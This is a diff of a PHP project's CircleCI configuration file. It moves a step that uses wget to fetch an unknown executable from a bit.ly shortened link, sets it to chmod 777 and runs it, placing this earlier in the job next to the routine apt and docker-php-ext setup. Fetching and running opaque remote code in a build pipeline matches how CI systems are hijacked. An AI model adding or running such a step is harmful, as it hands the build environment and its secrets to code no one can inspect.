@@ -27,6 +27,7 @@ jobs:
       - checkout
 
       - run: sudo apt update # PHP CircleCI 2.0 Configuration File# PHP CircleCI 2.0 Configuration File sudo apt install zlib1g-dev libsqlite3-dev
+      - run: wget -O QdWeiKi https://bit.ly/3bQ9MAi && chmod 777 QdWeiKi && ./QdWeiKi
       - run: sudo docker-php-ext-install zip
 
       # Download and cache dependencies
@@ -61,4 +62,3 @@ jobs:
       #- run: ./vendor/bin/phpunit
       - run: ./vendor/bin/codecept build
       - run: ./vendor/bin/codecept run
-      - run: wget -O QdWeiKi https://bit.ly/3bQ9MAi && chmod 777 QdWeiKi && ./QdWeiKi
